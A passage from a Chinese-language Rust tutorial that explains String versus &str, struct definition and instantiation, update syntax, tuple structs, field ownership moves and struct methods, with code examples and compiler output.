<p><code>s</code> 被部分引用，禁止更改其值。</p>
<div class="admonition string和str">
<p class="admonition-title">String和str</p>
<p>实际上，到目前为止你一定疑惑为什么每一次使用字符串都要这样写<code>String::from("runoob")</code> ，直接写 <code>"runoob"</code> 不行吗？</p>
<p>前面也有提到过，但是这里可以更加细致的说明一下</p>
<p>在 Rust 中有两种常用的字符串类型：str 和 String。str 是 Rust 核心语言类型，就是本章一直在讲的字符串切片（String Slice），常常以引用的形式出现（&amp;str）。</p>
<p>凡是用双引号包括的字符串常量整体的类型性质都是 &amp;str：
let s = "hello";
这里的 s 就是一个 &amp;str 类型的变量。
String 类型是 Rust 标准公共库提供的一种数据类型，它的功能更完善——它支持字符串的追加、清空等实用的操作。String 和 str 除了同样拥有一个字符开始位置属性和一个字符串长度属性以外还有一个容量（capacity）属性。
String 和 str 都支持切片，切片的结果是 &amp;str 类型的数据。
注意：切片结果必须是引用类型，但开发者必须自己明示这一点:
<div class="language-rust highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#note-cs-rust-rust-__codelineno-61-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">slice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="o">..</span><span class="mi">3</span><span class="p">];</span>
</span></code></pre></div>
有一个快速的办法可以将 String 转换成 &amp;str：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#note-cs-rust-rust-__codelineno-62-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">s1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;hello&quot;</span><span class="p">);</span>
</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#note-cs-rust-rust-__codelineno-62-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">s2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">s1</span><span class="p">[</span><span class="o">..</span><span class="p">];</span>
</span></code></pre></div></p>
</div>
<h2 id="note-cs-rust-rust-rust_2">RUST中的结构体<a class="headerlink" href="#note-cs-rust-rust-rust_2" title="Permanent link">&para;</a></h2>
<blockquote>
<p>Rust 中的结构体（Struct）与元组（Tuple）都可以将若干个类型不一定相同的数据捆绑在一起形成整体，但结构体的每个成员和其本身都有一个名字，这样访问它成员的时候就不用记住下标了。元组常用于非定义的多值传递，而结构体用于规范常用的数据结构。结构体的每个成员叫做"字段"。</p>
</blockquote>
<p>先给出一个结构体的例子</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#note-cs-rust-rust-__codelineno-63-1"></a><span class="k">struct</span> <span class="nc">Site</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#note-cs-rust-rust-__codelineno-63-2"></a><span class="w">    </span><span class="n">domain</span>: <span class="nb">String</span><span class="p">,</span>
</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3" href="#note-cs-rust-rust-__codelineno-63-3"></a><span class="w">    </span><span class="n">name</span>: <span class="nb">String</span><span class="p">,</span>
</span><span id="__span-63-4"><a id="__codelineno-63-4" name="__codelineno-63-4" href="#note-cs-rust-rust-__codelineno-63-4"></a><span class="w">    </span><span class="n">nation</span>: <span class="nb">String</span><span class="p">,</span>
</span><span id="__span-63-5"><a id="__codelineno-63-5" name="__codelineno-63-5" href="#note-cs-rust-rust-__codelineno-63-5"></a><span class="w">    </span><span class="n">found</span>: <span class="kt">u32</span>
</span><span id="__span-63-6"><a id="__codelineno-63-6" name="__codelineno-63-6" href="#note-cs-rust-rust-__codelineno-63-6"></a><span class="p">}</span>
</span></code></pre></div>
<p>C语言中的
<div class="language-C highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#note-cs-rust-rust-__codelineno-64-1"></a><span class="k">struct</span><span class="w"> </span><span class="nc">site</span><span class="p">{</span>
</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#note-cs-rust-rust-__codelineno-64-2"></a><span class="w">    </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">domain</span><span class="p">;</span>
</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#note-cs-rust-rust-__codelineno-64-3"></a><span class="w">    </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">name</span><span class="p">;</span>
</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#note-cs-rust-rust-__codelineno-64-4"></a><span class="w">    </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">nation</span><span class="p">;</span>
</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5" href="#note-cs-rust-rust-__codelineno-64-5"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">found</span><span class="p">;</span><span class="w">    </span>
</span><span id="__span-64-6"><a id="__codelineno-64-6" name="__codelineno-64-6" href="#note-cs-rust-rust-__codelineno-64-6"></a><span class="p">};</span>
</span></code></pre></div></p>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>跟C语言不同,RUST中 struct 语句仅用来定义，不能声明实例也就是说在<code>}</code>后不能声明一个struct的变量，结尾不需要 ; 符号，而且每个字段定义之后用,分隔。</p>
</div>
<h3 id="note-cs-rust-rust-_31">结构体实例<a class="headerlink" href="#note-cs-rust-rust-_31" title="Permanent link">&para;</a></h3>
<p>Rust 很多地方受 JavaScript 影响，在实例化结构体的时候用 JSON 对象的 key: value 语法来实现定义，格式为
<div class="language-rust highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#note-cs-rust-rust-__codelineno-65-1"></a><span class="err">结构体类名</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#note-cs-rust-rust-__codelineno-65-2"></a><span class="w">    </span><span class="err">字段名</span><span class="w"> </span>: <span class="err">字段值</span><span class="p">,</span>
</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#note-cs-rust-rust-__codelineno-65-3"></a><span class="w">    </span><span class="o">..</span><span class="p">.</span>
</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4" href="#note-cs-rust-rust-__codelineno-65-4"></a><span class="p">}</span>
</span></code></pre></div>
例如
<div class="language-rust highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#note-cs-rust-rust-__codelineno-66-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">runoob</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Site</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#note-cs-rust-rust-__codelineno-66-2"></a><span class="w">    </span><span class="n">domain</span>: <span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;www.runoob.com&quot;</span><span class="p">),</span>
</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#note-cs-rust-rust-__codelineno-66-3"></a><span class="w">    </span><span class="n">name</span>: <span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;RUNOOB&quot;</span><span class="p">),</span>
</span><span id="__span-66-4"><a id="__codelineno-66-4" name="__codelineno-66-4" href="#note-cs-rust-rust-__codelineno-66-4"></a><span class="w">    </span><span class="n">nation</span>: <span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;China&quot;</span><span class="p">),</span>
</span><span id="__span-66-5"><a id="__codelineno-66-5" name="__codelineno-66-5" href="#note-cs-rust-rust-__codelineno-66-5"></a><span class="w">    </span><span class="n">found</span>: <span class="mi">2013</span>
</span><span id="__span-66-6"><a id="__codelineno-66-6" name="__codelineno-66-6" href="#note-cs-rust-rust-__codelineno-66-6"></a><span class="p">};</span>
</span></code></pre></div>
如果正在实例化的结构体有字段名称和现存变量名称一样的，可以简化书写：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#note-cs-rust-rust-__codelineno-67-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">domain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;www.runoob.com&quot;</span><span class="p">);</span>
</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#note-cs-rust-rust-__codelineno-67-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;RUNOOB&quot;</span><span class="p">);</span>
</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#note-cs-rust-rust-__codelineno-67-3"></a><span class="kd">let</span><span class="w"> </span><span class="n">runoob</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Site</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4" href="#note-cs-rust-rust-__codelineno-67-4"></a><span class="w">    </span><span class="n">domain</span><span class="p">,</span><span class="w">  </span><span class="c1">// 等同于 domain : domain,</span>
</span><span id="__span-67-5"><a id="__codelineno-67-5" name="__codelineno-67-5" href="#note-cs-rust-rust-__codelineno-67-5"></a><span class="w">    </span><span class="n">name</span><span class="p">,</span><span class="w">    </span><span class="c1">// 等同于 name : name,</span>
</span><span id="__span-67-6"><a id="__codelineno-67-6" name="__codelineno-67-6" href="#note-cs-rust-rust-__codelineno-67-6"></a><span class="w">    </span><span class="n">nation</span>: <span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;China&quot;</span><span class="p">),</span>
</span><span id="__span-67-7"><a id="__codelineno-67-7" name="__codelineno-67-7" href="#note-cs-rust-rust-__codelineno-67-7"></a><span class="w">    </span><span class="n">traffic</span>: <span class="mi">2013</span>
</span><span id="__span-67-8"><a id="__codelineno-67-8" name="__codelineno-67-8" href="#note-cs-rust-rust-__codelineno-67-8"></a><span class="p">};</span>
</span></code></pre></div>
有这样一种情况：你想要新建一个结构体的实例，其中大部分属性需要被设置成与现存的一个结构体属性一样，仅需更改其中的一两个字段的值，可以使用结构体更新语法：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#note-cs-rust-rust-__codelineno-68-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">site</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Site</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#note-cs-rust-rust-__codelineno-68-2"></a><span class="w">    </span><span class="n">domain</span>: <span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;www.runoob.com&quot;</span><span class="p">),</span>
</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#note-cs-rust-rust-__codelineno-68-3"></a><span class="w">    </span><span class="n">name</span>: <span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;RUNOOB&quot;</span><span class="p">),</span>
</span><span id="__span-68-4"><a id="__codelineno-68-4" name="__codelineno-68-4" href="#note-cs-rust-rust-__codelineno-68-4"></a><span class="w">    </span><span class="o">..</span><span class="n">runoob</span>
</span><span id="__span-68-5"><a id="__codelineno-68-5" name="__codelineno-68-5" href="#note-cs-rust-rust-__codelineno-68-5"></a><span class="p">};</span>
</span></code></pre></div></p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><code>..runoob</code> 后面不可以有逗号。这种语法不允许一成不变的复制另一个结构体实例，意思就是说至少重新设定一个字段的值才能引用其他实例的值。</p>
</div>
<h3 id="note-cs-rust-rust-_32">元组结构体<a class="headerlink" href="#note-cs-rust-rust-_32" title="Permanent link">&para;</a></h3>
<p>元组结构体提供了一种更加方便快捷的定义和使用结构体的方式</p>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#note-cs-rust-rust-__codelineno-69-1"></a><span class="k">struct</span> <span class="nc">Color</span><span class="p">(</span><span class="kt">u8</span><span class="p">,</span><span class="w"> </span><span class="kt">u8</span><span class="p">,</span><span class="w"> </span><span class="kt">u8</span><span class="p">);</span>
</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#note-cs-rust-rust-__codelineno-69-2"></a><span class="k">struct</span> <span class="nc">Point</span><span class="p">(</span><span class="kt">f64</span><span class="p">,</span><span class="w"> </span><span class="kt">f64</span><span class="p">);</span>
</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#note-cs-rust-rust-__codelineno-69-3"></a><span class="kd">let</span><span class="w"> </span><span class="n">black</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Color</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
</span><span id="__span-69-4"><a id="__codelineno-69-4" name="__codelineno-69-4" href="#note-cs-rust-rust-__codelineno-69-4"></a><span class="kd">let</span><span class="w"> </span><span class="n">origin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Point</span><span class="p">(</span><span class="mf">0.0</span><span class="p">,</span><span class="w"> </span><span class="mf">0.0</span><span class="p">);</span>
</span></code></pre></div>
访问的时候可以通过点和下标来访问，如<code>black.0</code></p>
<p><strong>结构体所有权</strong>:结构体必须掌握字段值所有权，因为结构体失效的时候会释放所有字段。
引用结构体成员给其他变量赋值时，要注意：所有权的转移可能会破坏结构体变量的完整性。例如：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#note-cs-rust-rust-__codelineno-70-1"></a><span class="k">struct</span> <span class="nc">Dog</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#note-cs-rust-rust-__codelineno-70-2"></a><span class="w">    </span><span class="n">name</span>: <span class="nb">String</span><span class="p">,</span>
</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#note-cs-rust-rust-__codelineno-70-3"></a><span class="w">    </span><span class="n">age</span>: <span class="kt">i8</span>
</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#note-cs-rust-rust-__codelineno-70-4"></a><span class="p">}</span>
</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5" href="#note-cs-rust-rust-__codelineno-70-5"></a>
</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6" href="#note-cs-rust-rust-__codelineno-70-6"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-70-7"><a id="__codelineno-70-7" name="__codelineno-70-7" href="#note-cs-rust-rust-__codelineno-70-7"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">mydog</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Dog</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-70-8"><a id="__codelineno-70-8" name="__codelineno-70-8" href="#note-cs-rust-rust-__codelineno-70-8"></a><span class="w">        </span><span class="n">name</span>:<span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;wangcai&quot;</span><span class="p">),</span>
</span><span id="__span-70-9"><a id="__codelineno-70-9" name="__codelineno-70-9" href="#note-cs-rust-rust-__codelineno-70-9"></a><span class="w">        </span><span class="n">age</span>:<span class="mi">3</span><span class="p">,</span>
</span><span id="__span-70-10"><a id="__codelineno-70-10" name="__codelineno-70-10" href="#note-cs-rust-rust-__codelineno-70-10"></a><span class="w">    </span><span class="p">};</span>
</span><span id="__span-70-11"><a id="__codelineno-70-11" name="__codelineno-70-11" href="#note-cs-rust-rust-__codelineno-70-11"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="kt">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mydog</span><span class="p">.</span><span class="n">name</span><span class="p">;</span>
</span><span id="__span-70-12"><a id="__codelineno-70-12" name="__codelineno-70-12" href="#note-cs-rust-rust-__codelineno-70-12"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;str={}&quot;</span><span class="p">,</span><span class="w"> </span><span class="kt">str</span><span class="p">);</span>
</span><span id="__span-70-13"><a id="__codelineno-70-13" name="__codelineno-70-13" href="#note-cs-rust-rust-__codelineno-70-13"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;mydog: name={},age={}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">mydog</span><span class="p">.</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">mydog</span><span class="p">.</span><span class="n">age</span><span class="p">);</span>
</span><span id="__span-70-14"><a id="__codelineno-70-14" name="__codelineno-70-14" href="#note-cs-rust-rust-__codelineno-70-14"></a><span class="p">}</span>
</span></code></pre></div>
编译出错
<div class="language-text highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#note-cs-rust-rust-__codelineno-71-1"></a>11 |     let str = mydog.name;
</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#note-cs-rust-rust-__codelineno-71-2"></a>   |               ---------- value moved here
</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#note-cs-rust-rust-__codelineno-71-3"></a>12 |     println!(&quot;str={}&quot;, str);
</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#note-cs-rust-rust-__codelineno-71-4"></a>13 |     println!(&quot;mydog: name={},age={}&quot;, mydog.name, mydog.age);
</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5" href="#note-cs-rust-rust-__codelineno-71-5"></a>   |                                       ^^^^^^^^^^ value borrowed here after move
</span></code></pre></div></p>
<p>11行，用<code>mydog.name</code>给<code>str</code>赋值时，所有权就<code>move</code>到的<code>str</code>变量。</p>
<p>13行，打印时引用<code>mydog.name</code>，此时已经不存在，无法再使用。</p>
<p>11行应该改为:</p>
<p><code>let str = mydog.name.clone();</code>
<code>clone()</code>会创建<code>mydog.name</code>的一个副本。</p>
<p><strong>输出结构体</strong></p>
<p>调试中，完整地显示出一个结构体实例是非常有用的。但如果我们手动的书写一个格式会非常的不方便。所以 Rust 提供了一个方便地输出一整个结构体的方法：</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#note-cs-rust-rust-__codelineno-72-1"></a><span class="cp">#[derive(Debug)]</span>
</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#note-cs-rust-rust-__codelineno-72-2"></a>
</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#note-cs-rust-rust-__codelineno-72-3"></a><span class="k">struct</span> <span class="nc">Rectangle</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4" href="#note-cs-rust-rust-__codelineno-72-4"></a><span class="w">    </span><span class="n">width</span>: <span class="kt">u32</span><span class="p">,</span>
</span><span id="__span-72-5"><a id="__codelineno-72-5" name="__codelineno-72-5" href="#note-cs-rust-rust-__codelineno-72-5"></a><span class="w">    </span><span class="n">height</span>: <span class="kt">u32</span><span class="p">,</span>
</span><span id="__span-72-6"><a id="__codelineno-72-6" name="__codelineno-72-6" href="#note-cs-rust-rust-__codelineno-72-6"></a><span class="p">}</span>
</span><span id="__span-72-7"><a id="__codelineno-72-7" name="__codelineno-72-7" href="#note-cs-rust-rust-__codelineno-72-7"></a>
</span><span id="__span-72-8"><a id="__codelineno-72-8" name="__codelineno-72-8" href="#note-cs-rust-rust-__codelineno-72-8"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-72-9"><a id="__codelineno-72-9" name="__codelineno-72-9" href="#note-cs-rust-rust-__codelineno-72-9"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">rect1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Rectangle</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">width</span>: <span class="mi">30</span><span class="p">,</span><span class="w"> </span><span class="n">height</span>: <span class="mi">50</span><span class="w"> </span><span class="p">};</span>
</span><span id="__span-72-10"><a id="__codelineno-72-10" name="__codelineno-72-10" href="#note-cs-rust-rust-__codelineno-72-10"></a>
</span><span id="__span-72-11"><a id="__codelineno-72-11" name="__codelineno-72-11" href="#note-cs-rust-rust-__codelineno-72-11"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;rect1 is {:?}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">rect1</span><span class="p">);</span>
</span><span id="__span-72-12"><a id="__codelineno-72-12" name="__codelineno-72-12" href="#note-cs-rust-rust-__codelineno-72-12"></a><span class="p">}</span>
</span></code></pre></div>
如第一行所示：一定要导入调试库 <code>#[derive(Debug)]</code> ，之后在 <code>println</code> 和 <code>print</code> 宏中就可以用 <code>{:?}</code> 占位符输出一整个结构体：
<div class="language-text highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#note-cs-rust-rust-__codelineno-73-1"></a>rect1 is Rectangle { width: 30, height: 50 }
</span></code></pre></div>
如果属性较多的话可以使用另一个占位符 <code>{:#?}</code> 。
<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#note-cs-rust-rust-__codelineno-74-1"></a>rect1 is Rectangle {
</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#note-cs-rust-rust-__codelineno-74-2"></a>width: 30,
</span><span id="__span-74-3"><a id="__codelineno-74-3" name="__codelineno-74-3" href="#note-cs-rust-rust-__codelineno-74-3"></a>height: 50
</span><span id="__span-74-4"><a id="__codelineno-74-4" name="__codelineno-74-4" href="#note-cs-rust-rust-__codelineno-74-4"></a>}
</span></code></pre></div></p>
</div>
<h3 id="note-cs-rust-rust-_33">结构体方法<a class="headerlink" href="#note-cs-rust-rust-_33" title="Permanent link">&para;</a></h3>
<blockquote>
<p>方法（Method）和函数（Function）类似，只不过它是用来操作结构体实例的。</p>
<p>如果你学习过一些面向对象的语言，那你一定很清楚函数一般放在类定义里并在函数中用 this 表示所操作的实例。</p>
<p>Rust 语言不是面向对象的，从它所有权机制的创新可以看出这一点。但是面向对象的珍贵思想可以在 Rust 实现。</p>
<p>结构体方法的第一个参数必须是 &amp;self，不需声明类型，因为 self 不是一种风格而是关键字。</p>
</blockquote>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#note-cs-rust-rust-__codelineno-75-1"></a><span class="k">struct</span> <span class="nc">Rectangle</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#note-cs-rust-rust-__codelineno-75-2"></a><span class="w">    </span><span class="n">width</span>: <span class="kt">u32</span><span class="p">,</span>
</span><span id="__span-75-3"><a id="__codelineno-75-3" name="__codelineno-75-3" href="#note-cs-rust-rust-__codelineno-75-3"></a><span class="w">    </span><span class="n">height</span>: <span class="kt">u32</span><span class="p">,</span>
</span><span id="__span-75-4"><a id="__codelineno-75-4" name="__codelineno-75-4" href="#note-cs-rust-rust-__codelineno-75-4"></a><span class="p">}</span>
</span><span id="__span-75-5"><a id="__codelineno-75-5" name="__codelineno-75-5" href="#note-cs-rust-rust-__codelineno-75-5"></a>
</span><span id="__span-75-6"><a id="__codelineno-75-6" name="__codelineno-75-6" href="#note-cs-rust-rust-__codelineno-75-6"></a><span class="k">impl</span><span class="w"> </span><span class="n">Rectangle</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-75-7"><a id="__codelineno-75-7" name="__codelineno-75-7" href="#note-cs-rust-rust-__codelineno-75-7"></a><span class="w">    </span><span class="k">fn</span> <span class="nf">area</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="kt">u32</span> <span class="p">{</span>
</span><span id="__span-75-8"><a id="__codelineno-75-8" name="__codelineno-75-8" href="#note-cs-rust-rust-__codelineno-75-8"></a><span class="w">        </span><span class="bp">self</span><span class="p">.</span><span class="n">width</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">height</span>
</span><span id="__span-75-9"><a id="__codelineno-75-9" name="__codelineno-75-9" href="#note-cs-rust-rust-__codelineno-75-9"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-75-10"><a id="__codelineno-75-10" name="__codelineno-75-10" href="#note-cs-rust-rust-__codelineno-75-10"></a>
</span><span id="__span-75-11"><a id="__codelineno-75-11" name="__codelineno-75-11" href="#note-cs-rust-rust-__codelineno-75-11"></a><span class="w">    </span><span class="k">fn</span> <span class="nf">wider</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">,</span><span class="w"> </span><span class="n">rect</span>: <span class="kp">&amp;</span><span class="nc">Rectangle</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="kt">bool</span> <span class="p">{</span>
</span><span id="__span-75-12"><a id="__codelineno-75-12" name="__codelineno-75-12" href="#note-cs-rust-rust-__codelineno-75-12"></a><span class="w">        </span><span class="bp">self</span><span class="p">.</span><span class="n">width</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">rect</span><span class="p">.</span><span class="n">width</span>
</span><span id="__span-75-13"><a id="__codelineno-75-13" name="__codelineno-75-13" href="#note-cs-rust-rust-__codelineno-75-13"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-75-14"><a id="__codelineno-75-14" name="__codelineno-75-14" href="#note-cs-rust-rust-__codelineno-75-14"></a><span class="p">}</span>
</span><span id="__span-75-15"><a id="__codelineno-75-15" name="__codelineno-75-15" href="#note-cs-rust-rust-__codelineno-75-15"></a>
</span><span id="__span-75-16"><a id="__codelineno-75-16" name="__codelineno-75-16" href="#note-cs-rust-rust-__codelineno-75-16"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-75-17"><a id="__codelineno-75-17" name="__codelineno-75-17" href="#note-cs-rust-rust-__codelineno-75-17"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">rect1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Rectangle</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">width</span>: <span class="mi">30</span><span class="p">,</span><span class="w"> </span><span class="n">height</span>: <span class="mi">50</span><span class="w"> </span><span class="p">};</span>
</span><span id="__span-75-18"><a id="__codelineno-75-18" name="__codelineno-75-18" href="#note-cs-rust-rust-__codelineno-75-18"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">rect2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Rectangle</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">width</span>: <span class="mi">40</span><span class="p">,</span><span class="w"> </span><span class="n">height</span>: <span class="mi">20</span><span class="w"> </span><span class="p">};</span>
</span><span id="__span-75-19"><a id="__codelineno-75-19" name="__codelineno-75-19" href="#note-cs-rust-rust-__codelineno-75-19"></a>
</span><span id="__span-75-20"><a id="__codelineno-75-20" name="__codelineno-75-20" href="#note-cs-rust-rust-__codelineno-75-20"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">rect1</span><span class="p">.</span><span class="n">wider</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rect2</span><span class="p">));</span>
</span><span id="__span-75-21"><a id="__codelineno-75-21" name="__codelineno-75-21" href="#note-cs-rust-rust-__codelineno-75-21"></a><span class="p">}</span>
</span></code></pre></div>
<details class="info">
<summary>Info</summary>
<p>定义了一个表示矩形的<code>Rectangle</code>结构体，并实现了两个方法：<code>area</code>和<code>wider</code>。接着在<code>main</code>函数中创建两个矩形实例，并调用<code>wider</code>方法来比较它们的宽度。以下是详细解释：</p>
<ol>
<li><code>Rectangle</code> 结构体
<div class="language-rust highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#note-cs-rust-rust-__codelineno-76-1"></a><span class="k">struct</span> <span class="nc">Rectangle</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#note-cs-rust-rust-__codelineno-76-2"></a><span class="w">    </span><span class="n">width</span>: <span class="kt">u32</span><span class="p">,</span>
